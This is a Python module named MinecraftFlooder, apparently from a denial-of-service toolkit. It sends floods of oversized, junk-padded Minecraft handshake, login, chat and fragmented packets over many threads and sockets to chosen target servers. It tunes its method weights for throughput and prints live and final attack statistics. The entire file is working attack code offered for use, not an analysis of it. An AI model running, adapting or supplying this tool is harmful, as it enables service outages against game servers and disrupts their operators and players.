import struct
import json
import random
import time
import threading
import logging
import socket
import zlib
from typing import List, Dict, Optional, Tuple, Union
from .utilities import AttackModule, UI, Style

class MinecraftFlooder(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60,
                 threads: int = 5, debug: bool = False, skip_prompt: bool = False):
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        
        # Add thread-safe stats
        self._stats_lock = threading.Lock()
        self._stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "successful": 0,
            "failures": 0
        }
        
        # Initialize stats monitoring
        self.last_update_time = time.time()
        self.update_interval = 1.0
        
        # Performance monitoring
        self.perf_data = {
            "last_packets": 0,
            "last_bytes": 0,
            "last_time": time.time(),
            "current_pps": 0,
            "current_mbps": 0,
            "highest_pps": 0,
            "highest_mbps": 0
        }
        
        # Status format
        self.status_format = "[{timestamp}] Target: {target} | Port: {port} | Method: MINECRAFT | PPS: {pps:,.2f} | BPS: {mbps:.2f} MB | Success Rate: {rate:d}%"
        
        # Minecraft protocol settings - expanded range
        self.protocol_versions = [
            47,     # 1.8.x
            107,    # 1.9
            210,    # 1.10.x
            315,    # 1.11
            335,    # 1.12
            340,    # 1.12.1
            393,    # 1.13
            401,    # 1.13.1
            404,    # 1.13.2
            498,    # 1.14.4
            573,    # 1.15.1
            735,    # 1.16
            751,    # 1.16.2
            754,    # 1.16.5
            755,    # 1.17.1
            757,    # 1.18.2
            760,    # 1.19.2
            763     # 1.20.1
        ]
        self.server_address = None
        self.server_port = 25565  # Default Minecraft port
        self.connection_timeout = 0.5
        self.max_failures = 5000
        
        # Optimized settings
        self.sockets_per_thread = 150  # Increased socket count
        self.reconnect_delay = 0.001   # Minimal delay
        self.max_retries = 2
        self.connection_backoff_factor = 1.2
        
        # Attack methods
        self.attack_methods = [
            "status_ping",       # Standard server list ping
            "login_spam",        # Send login packets
            "chat_spam",         # Send login then chat packets
            "packet_fragments",  # Send incomplete packets
            "oversized_ping"     # Send oversized status ping
        ]
        
        # Adjusted method weights for throughput
        self.method_weights = {
            "status_ping": 60,    # Most efficient method
            "login_spam": 30,     # Second most efficient
            "chat_spam": 5,
            "packet_fragments": 3,
            "oversized_ping": 2
        }
        
        # Status ping payloads
        self.ping_payloads = self._generate_ping_payloads()
        
        # Login payloads
        self.usernames = self._generate_usernames(200)  # Create 200 random usernames
        self.login_payloads = self._generate_login_payloads()
        
        # Chat spam messages
        self.chat_messages = self._generate_chat_messages(100)  # 100 different messages
        
        # Dynamic resource adjustment
        self.adaptive_mode = True
        self.last_adjustment_time = time.time()
        self.adjustment_interval = 5.0  # Seconds between load adjustments
        
        if debug:
            self.logger = logging.getLogger(self.__class__.__name__)
            self.logger.setLevel(logging.DEBUG)

    def write_varint(self, value: int) -> bytes:
        """Write VarInt for Minecraft protocol"""
        result = b''
        while True:
            byte = value & 0x7F
            value >>= 7
            if value:
                byte |= 0x80
            result += bytes([byte])
            if not value:
                break
        return result
    
    def write_string(self, value: str) -> bytes:
        """Write a string with length prefix (VarInt)"""
        utf_value = value.encode('utf-8')
        return self.write_varint(len(utf_value)) + utf_value
    
    def _generate_usernames(self, count: int) -> List[str]:
        """Generate a list of random usernames for login flood"""
        adjectives = ['Happy', 'Sad', 'Angry', 'Brave', 'Lucky', 'Epic', 'Pro', 'Fast', 
                      'Swift', 'Clever', 'Wild', 'Royal', 'Silent', 'Shadow', 'Quick']
        nouns = ['Player', 'Miner', 'Gamer', 'Ninja', 'Warrior', 'Knight', 'Hunter', 'Wizard',
                'Assassin', 'Archer', 'Dragon', 'Wolf', 'Tiger', 'Eagle', 'Fox']
        
        usernames = []
        for _ in range(count):
            adj = random.choice(adjectives)
            noun = random.choice(nouns)
            num = random.randint(1, 9999)
            username = f"{adj}{noun}{num}"
            usernames.append(username)
            
        return usernames

    def _generate_chat_messages(self, count: int) -> List[str]:
        """Generate a list of chat messages for chat spam"""
        messages = []
        
        # Base message patterns
        patterns = [
            "Hello everyone!",
            "I'm new here, can someone help me?",
            "How do I get diamonds?",
            "Where is the nearest village?",
            "Can anyone teleport me?",
            "Looking for teammates",
            "Who wants to trade?",
            "Free diamonds at spawn!",
            "Follow me for a surprise",
            "Anyone want to join my faction?"
        ]
        
        # Generate variations of patterns with random suffixes
        for _ in range(count):
            base = random.choice(patterns)
            if random.random() < 0.7:  # 70% chance to add suffix
                suffix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=random.randint(3, 8)))
                message = f"{base} {suffix}"
            else:
                message = base
            messages.append(message)
            
        return messages

    def _generate_ping_payloads(self) -> List[bytes]:
        """Generate a variety of Minecraft server list ping payloads"""
        payloads = []
        
        def create_handshake(protocol: int, hostname: str, port: int, next_state: int = 1) -> bytes:
            # Build packet without length prefix first
            packet = b'\x00'  # Packet ID
            packet += self.write_varint(protocol)
            
            # Generate massive padding (5-10x larger)
            padding = "A" * random.randint(5000, 10000)
            padded_hostname = f"{hostname}.{padding}.example.com"
            packet += self.write_string(padded_hostname)
            
            packet += struct.pack('>H', port)
            packet += self.write_varint(next_state)
            
            # Add huge chunks of compressed data
            compressed_data = zlib.compress(b'X' * random.randint(10000, 20000))
            packet += compressed_data
            
            return self.write_varint(len(packet)) + packet

        # Generate base domains
        domains = ["localhost", "mc.example.com", "test.server.local"]
        
        for protocol in self.protocol_versions:
            for domain in domains:
                # Create massive data blocks
                large_data = zlib.compress(bytes([random.randint(0, 255) for _ in range(15000)]))
                
                # Standard handshake + status
                handshake = create_handshake(protocol, domain, 25565)
                status_request = self.write_varint(1) + b'\x00' + large_data
                payloads.append(handshake + status_request)
                
                # Add huge ping payload
                ping_data = struct.pack('>Q', int(time.time() * 1000))
                huge_padding = zlib.compress(b'X' * random.randint(20000, 30000))
                ping_packet = self.write_varint(len(ping_data + huge_padding)) + b'\x01' + ping_data + huge_padding
                payloads.append(handshake + ping_packet)
        
        return payloads

    def _generate_login_payloads(self) -> List[bytes]:
        """Generate massive login packets"""
        login_payloads = []
        
        for protocol in self.protocol_versions:
            for username in random.sample(self.usernames, min(5, len(self.usernames))):
                # Create huge padding for handshake
                padding = "X" * random.randint(5000, 10000)
                
                # Handshake packet with login state
                handshake = b'\x00'
                handshake += self.write_varint(protocol)
                handshake += self.write_string(f"localhost.{padding}.local")
                handshake += struct.pack('>H', 25565)
                handshake += b'\x02'
                handshake_packet = self.write_varint(len(handshake)) + handshake
                
                # Massive login packet
                login_start = b'\x00'
                login_start += self.write_string(username + "_" + "A" * random.randint(3000, 5000))
                
                # Add huge compressed custom data
                custom_data = zlib.compress(bytes([random.randint(0, 255) for _ in range(20000)]))
                login_start += custom_data
                
                if protocol >= 760:  # 1.19+
                    uuid_data = b'\x00' * 16
                    login_start += uuid_data
                    login_start += zlib.compress(b'X' * random.randint(15000, 25000))
                
                login_start_packet = self.write_varint(len(login_start)) + login_start
                login_payloads.append(handshake_packet + login_start_packet)
                
        return login_payloads

    def generate_chat_payload(self, protocol: int, username: str, message: str) -> bytes:
        """Generate massive chat packet payload"""
        # Create huge padding
        padding = "A" * random.randint(5000, 10000)
        padded_message = f"{message} {padding}"
        
        if protocol < 340:  # Pre-1.12.2
            chat_packet = b'\x02'
            chat_packet += self.write_string(padded_message)
            chat_packet += zlib.compress(b'X' * random.randint(10000, 20000))
        else:
            chat_packet = b'\x03'
            chat_packet += self.write_string(padded_message)
            chat_packet += b'\x00'
            
            # Add massive compressed payload
            custom_data = zlib.compress(bytes([random.randint(0, 255) for _ in range(25000)]))
            chat_packet += custom_data
            
            if protocol >= 760:
                uuid_data = b'\x00' * 16
                chat_packet += uuid_data
                chat_packet += zlib.compress(b'X' * random.randint(20000, 30000))
        
        return self.write_varint(len(chat_packet)) + chat_packet

    def increment_stat(self, key: str, value: int = 1):
        """Thread-safe method to increment stats"""
        with self._stats_lock:
            self._stats[key] += value

    def create_socket(self, target: str, port: int) -> Optional[socket.socket]:
        """Optimized socket creation"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(0.5)  # Reduced timeout
            sock.connect((target, port))
            return sock
        except:
            return None

    def send_packet_safely(self, sock: socket.socket, data: bytes) -> bool:
        """Send packet with error handling"""
        if not sock:
            return False
            
        try:
            sock.send(data)
            self.increment_stat("packets_sent")
            self.increment_stat("bytes_sent", len(data))
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            self.increment_stat("failures")
            return False

    def flood_worker(self, target: str, port: int):
        """Optimized worker function with batch processing"""
        sockets = []
        failures = 0
        consecutive_failures = 0
        backoff_time = self.reconnect_delay
        last_success_time = time.time()
        
        # Pre-generate packet batches
        ping_batch = random.sample(self.ping_payloads, min(10, len(self.ping_payloads)))
        login_batch = random.sample(self.login_payloads, min(10, len(self.login_payloads)))
        
        while self.running and failures < self.max_failures:
            try:
                current_time = time.time()
                if current_time - last_success_time > 3:  # Reduced reset time
                    sockets = []
                    consecutive_failures = 0
                    backoff_time = self.reconnect_delay
                    last_success_time = current_time

                # Create multiple sockets at once
                new_sockets = []
                for _ in range(3):  # Try to maintain 3 active sockets
                    sock = self.create_socket(target, port)
                    if sock:
                        new_sockets.append(sock)

                if new_sockets:
                    for sock in new_sockets:
                        # Send multiple packets per socket
                        for _ in range(5):  # Increased packets per socket
                            success = False
                            attack_method = self.choose_attack_method()
                            
                            try:
                                if attack_method == "status_ping":
                                    for payload in ping_batch:
                                        success = self.send_packet_safely(sock, payload)
                                        if success:
                                            self.increment_stat("successful")
                                elif attack_method == "login_spam":
                                    for payload in login_batch:
                                        success = self.send_packet_safely(sock, payload)
                                        if success:
                                            self.increment_stat("successful")
                                else:
                                    # Other methods
                                    if attack_method == "chat_spam":
                                        success = self.chat_spam_attack(sock, target, port)
                                    elif attack_method == "packet_fragments":
                                        success = self.packet_fragment_attack(sock, target, port)
                                    elif attack_method == "oversized_ping":
                                        success = self.oversized_ping_attack(sock, target, port)
                            
                                if success:
                                    last_success_time = time.time()
                                    consecutive_failures = 0
                                    backoff_time = self.reconnect_delay
                                    
                            except:
                                break
                            
                            time.sleep(0.0001)  # Minimal delay between packets
                        
                        sockets.append(sock)
                        if len(sockets) > self.sockets_per_thread:
                            old_sock = sockets.pop(0)
                            try:
                                old_sock.close()
                            except:
                                pass
                
                else:
                    consecutive_failures += 1
                    failures += 1
                    
                    if consecutive_failures > 3:
                        backoff_time = min(backoff_time * 1.2, 0.1)  # Reduced max backoff
                        time.sleep(backoff_time)
                    else:
                        time.sleep(self.reconnect_delay)
                    continue
                
                time.sleep(0.001)  # Minimal delay between connections
                
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in flood_worker: {str(e)}")
                failures += 1
                consecutive_failures += 1
                time.sleep(backoff_time)
        
        # Cleanup sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

    def status_ping_attack(self, sock: socket.socket, target: str, port: int) -> bool:
        """Send Minecraft status ping packets"""
        if not sock:
            return False
            
        try:
            # Send random ping payload
            payload = random.choice(self.ping_payloads)
            success = self.send_packet_safely(sock, payload)
            
            if success:
                # Try to read response but don't wait long
                try:
                    sock.settimeout(0.5)
                    response = sock.recv(1024)
                    if response:
                        self.increment_stat("successful")
                except socket.timeout:
                    # Even if read times out, the packet was sent
                    self.increment_stat("successful")
                    
            return success
        except Exception as e:
            if self.debug:
                self.logger.error(f"Error in status_ping_attack: {str(e)}")
            self.increment_stat("failures")
            return False

    def login_spam_attack(self, sock: socket.socket, target: str, port: int) -> bool:
        """Send Minecraft login packets"""
        if not sock:
            return False
            
        try:
            # Send random login payload
            payload = random.choice(self.login_payloads)
            success = self.send_packet_safely(sock, payload)
            
            if success:
                self.increment_stat("successful")
                
                # Wait briefly for a response but don't require one
                try:
                    sock.settimeout(0.3)
                    response = sock.recv(1024)
                except socket.timeout:
                    pass
                    
            return success
        except Exception as e:
            if self.debug:
                self.logger.error(f"Error in login_spam_attack: {str(e)}")
            self.increment_stat("failures")
            return False

    def chat_spam_attack(self, sock: socket.socket, target: str, port: int) -> bool:
        """Send login then attempt to send chat messages"""
        if not sock:
            return False
            
        try:
            # First send login payload
            payload = random.choice(self.login_payloads)
            login_success = self.send_packet_safely(sock, payload)
            
            if not login_success:
                return False
                
            # Now send a chat message (this likely won't work without authentication,
            # but it adds to the server processing burden)
            protocol = random.choice(self.protocol_versions)
            username = random.choice(self.usernames)
            message = random.choice(self.chat_messages)
            
            chat_payload = self.generate_chat_payload(protocol, username, message)
            chat_success = self.send_packet_safely(sock, chat_payload)
            
            if chat_success:
                self.increment_stat("successful")
                
            return login_success or chat_success
            
        except Exception as e:
            if self.debug:
                self.logger.error(f"Error in chat_spam_attack: {str(e)}")
            self.increment_stat("failures")
            return False

    def packet_fragment_attack(self, sock: socket.socket, target: str, port: int) -> bool:
        """Send intentionally fragmented or partial packets"""
        if not sock:
            return False
            
        try:
            # Choose a random payload and optimize fragment size
            payload = random.choice(self.ping_payloads)
            base_size = max(len(payload) // 4, 32)  # Ensure minimum viable size
            fragment_size = random.randint(base_size, base_size + 64)
            fragments = [payload[i:i+fragment_size] for i in range(0, len(payload), fragment_size)]
            
            success = False
            consecutive_successes = 0
            
            for fragment in fragments:
                if self.send_packet_safely(sock, fragment):
                    success = True
                    consecutive_successes += 1
                    
                    # Dynamically adjust timing based on success
                    if consecutive_successes >= 3:
                        time.sleep(0.001)  # Very small delay on consistent success
                    else:
                        time.sleep(0.005)  # Slightly larger delay otherwise
                else:
                    consecutive_successes = 0
                    time.sleep(0.002)  # Brief recovery delay on failure
                    
                # More strategic abort condition
                if consecutive_successes >= 2 and random.random() < 0.15:  # 15% chance to abort after 2+ successes
                    self.increment_stat("successful")
                    return True
            
            if success:
                self.increment_stat("successful")
                
            return success
            
        except Exception as e:
            if self.debug:
                self.logger.error(f"Error in packet_fragment_attack: {str(e)}")
            self.increment_stat("failures")
            return False

    def oversized_ping_attack(self, sock: socket.socket, target: str, port: int) -> bool:
        """Send oversized ping data to stress packet handling"""
        if not sock:
            return False
            
        try:
            # Create base handshake packet
            protocol = random.choice(self.protocol_versions)
            handshake = b'\x00'  # Packet ID
            handshake += self.write_varint(protocol)  # Protocol version
            
            # Create an extra long hostname
            long_hostname = "mc." + "a" * random.randint(200, 500) + ".example.com"
            handshake += self.write_string(long_hostname)
            
            # Complete the handshake
            handshake += struct.pack('>H', 25565)  # Server port
            handshake += b'\x01'  # Next state (1 for status)
            
            # Add length prefix
            handshake_packet = self.write_varint(len(handshake)) + handshake
            
            # Add status request
            status_request = self.write_varint(1) + b'\x00'
            
            # Send oversized packet
            success = self.send_packet_safely(sock, handshake_packet + status_request)
            
            if success:
                self.increment_stat("successful")
                
            return success
            
        except Exception as e:
            if self.debug:
                self.logger.error(f"Error in oversized_ping_attack: {str(e)}")
            self.increment_stat("failures")
            return False

    def choose_attack_method(self) -> str:
        """Choose an attack method based on weighted distribution"""
        methods = list(self.method_weights.keys())
        weights = list(self.method_weights.values())
        return random.choices(methods, weights=weights, k=1)[0]

    def adjust_resources(self):
        """Dynamically adjust resource usage based on performance"""
        if not self.adaptive_mode or time.time() - self.last_adjustment_time < self.adjustment_interval:
            return
            
        self.last_adjustment_time = time.time()
        
        # Check current performance
        current_pps = self.perf_data["current_pps"]
        success_rate = (self._stats["successful"] / max(1, self._stats["packets_sent"])) * 100
        
        # More conservative adjustments
        if success_rate < 50:
            # Focus heavily on reliable methods when success rate is low
            self.method_weights["status_ping"] = 60
            self.method_weights["login_spam"] = 20
            self.method_weights["chat_spam"] = 10
            self.method_weights["packet_fragments"] = 5
            self.method_weights["oversized_ping"] = 5
            
            # Reduce socket count and increase delays
            self.sockets_per_thread = max(50, self.sockets_per_thread - 10)
            self.reconnect_delay = min(0.02, self.reconnect_delay * 1.1)
            
        elif success_rate > 80:
            # Gradually increase complexity when things are working well
            self.method_weights["status_ping"] = 40
            self.method_weights["login_spam"] = 30
            self.method_weights["chat_spam"] = 15
            self.method_weights["packet_fragments"] = 10
            self.method_weights["oversized_ping"] = 5
            
            # Carefully increase socket count
            self.sockets_per_thread = min(150, self.sockets_per_thread + 5)
            self.reconnect_delay = max(0.005, self.reconnect_delay * 0.95)
            
        if self.debug:
            self.logger.debug(f"Resource adjustment: sockets={self.sockets_per_thread}, timeout={self.connection_timeout:.2f}, weights={self.method_weights}")

    def start(self):
        """Start Minecraft flood operation"""
        super().start()
        
        UI.print_header("Enhanced Minecraft Flood Operation")
        UI.print_info(f"Starting improved Minecraft flood against {len(self.targets)} targets")
        
        # Show configuration
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Protocol versions: Multiple ({min(self.protocol_versions)}-{max(self.protocol_versions)})")
        print(f"- Threads per target: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Sockets per thread: {self.sockets_per_thread}")
        print(f"- Attack methods: {', '.join(self.attack_methods)}")
        print(f"- Adaptive mode: {'Enabled' if self.adaptive_mode else 'Disabled'}")
        
        # Start worker threads
        total_threads = len(self.targets) * len(self.ports) * self.threads
        UI.print_info(f"Launching {total_threads} worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for _ in range(self.threads):
                    thread = threading.Thread(target=self.flood_worker, args=(target, port))
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads,
                                           prefix=f"Threads: {thread_count}/{total_threads}",
                                           length=30)
        
        # Start performance monitoring
        monitor_thread = threading.Thread(target=self.monitor_performance)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start resource adjustment thread if adaptive mode is on
        if self.adaptive_mode:
            adjustment_thread = threading.Thread(target=self.adjustment_loop)
            adjustment_thread.daemon = True
            adjustment_thread.start()
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        finally:
            self.stop()

    def adjustment_loop(self):
        """Loop for periodic resource adjustment"""
        while self.running:
            try:
                self.adjust_resources()
                time.sleep(1)
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in adjustment loop: {e}")
                time.sleep(5)

    def monitor_performance(self):
        """Monitor and display performance stats in real-time"""
        last_update = time.time()
        last_packets = 0
        last_bytes = 0
        status_counter = 0
        max_status_lines = 20
        
        while self.running:
            try:
                time.sleep(0.1)
                current_time = time.time()
                elapsed = current_time - last_update
                
                if elapsed >= 1.0:
                    # Get current stats safely
                    with self._stats_lock:
                        current_packets = self._stats["packets_sent"]
                        current_bytes = self._stats["bytes_sent"]
                        current_successful = self._stats["successful"]
                        current_failures = self._stats["failures"]
                    
                    # Calculate rates
                    pps = (current_packets - last_packets) / elapsed
                    bytes_sent = current_bytes - last_bytes
                    mbps = (bytes_sent * 8) / (1024 * 1024 * elapsed)
                    
                    total_attempts = current_successful + current_failures
                    success_rate = int((current_successful / total_attempts * 100) 
                                     if total_attempts > 0 else 0)
                    
                    # Update peak stats
                    self.perf_data["current_pps"] = pps
                    self.perf_data["current_mbps"] = mbps
                    self.perf_data["highest_pps"] = max(self.perf_data["highest_pps"], pps)
                    self.perf_data["highest_mbps"] = max(self.perf_data["highest_mbps"], mbps)
                    
                    # Format status line
                    timestamp = time.strftime("%H:%M:%S", time.localtime(current_time))
                    status_line = self.status_format.format(
                        timestamp=timestamp,
                        target=self.targets[0] if self.targets else "unknown",
                        port=self.ports[0] if self.ports else 0,
                        pps=pps,
                        mbps=mbps,
                        
                        rate=success_rate
                    )
                    
                    # Print status line with coloring for important metrics
                    if success_rate > 80:
                        rate_style = f"{Style.SUCCESS}{success_rate}{Style.RESET}"
                    elif success_rate > 50:
                        rate_style = f"{Style.INFO}{success_rate}{Style.RESET}"
                    else:
                        rate_style = f"{Style.WARNING}{success_rate}{Style.RESET}"
                        
                    enhanced_status = status_line.replace(f"Rate: {success_rate}%", f"Rate: {rate_style}%")
                    
                    # Highlight high PPS values
                    if pps > self.perf_data["highest_pps"] * 0.9:  # Within 90% of highest
                        pps_str = f"{pps:,.2f}"
                        enhanced_status = enhanced_status.replace(pps_str, f"{Style.SUCCESS}{pps_str}{Style.RESET}")
                    
                    print(enhanced_status)
                    status_counter += 1
                    
                    # After a certain number of status lines, show a separator and summary
                    if status_counter >= max_status_lines:
                        separator = "-" * len(status_line)
                        print(separator)
                        
                        # Show a summary of peak performance
                        peak_summary = f"[PEAK] PPS: {Style.BOLD}{self.perf_data['highest_pps']:,.2f}{Style.RESET} | " \
                                      f"BPS: {Style.BOLD}{self.perf_data['highest_mbps']:.2f}{Style.RESET} MB"
                        print(peak_summary)
                        
                        # Show attack method distribution
                        method_dist = " | ".join([f"{m}: {w}%" for m, w in self.method_weights.items()])
                        print(f"[METHODS] {method_dist}")
                        
                        print(separator)
                        status_counter = 0
                    
                    # Update stored values for next iteration
                    last_packets = current_packets
                    last_bytes = current_bytes
                    last_update = current_time
                    
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in performance monitoring: {e}")
                time.sleep(1)

    def stop(self):
        """Stop the flooding operation"""
        if not self.running:
            return
            
        self.running = False
        
        # Print final statistics
        elapsed = time.time() - self.start_time
        
        UI.print_header("Attack Summary")
        print(f"{Style.BOLD}Duration:{Style.RESET} {elapsed:.2f} seconds")
        print(f"{Style.BOLD}Total packets sent:{Style.RESET} {self._stats['packets_sent']:,}")
        print(f"{Style.BOLD}Average PPS:{Style.RESET} {self._stats['packets_sent'] / max(1, elapsed):,.2f}")
        print(f"{Style.BOLD}Total data sent:{Style.RESET} {self._stats['bytes_sent'] / (1024*1024):.2f} MB")
        print(f"{Style.BOLD}Success rate:{Style.RESET} {(self._stats['successful'] / max(1, self._stats['packets_sent']) * 100):.1f}%")
        
        # Show peak performance
        print(f"\n{Style.BOLD}Peak performance:{Style.RESET}")
        print(f"- Highest PPS: {self.perf_data['highest_pps']:,.2f}")
        print(f"- Highest throughput: {self.perf_data['highest_mbps']:.2f} MB/s")
        
        # If debug is enabled, show attack method distribution
        if self.debug:
            print(f"\n{Style.BOLD}Attack method distribution:{Style.RESET}")
            for method, weight in self.method_weights.items():
                print(f"- {method}: {weight}%")
                
        UI.print_success("Attack completed successfully")
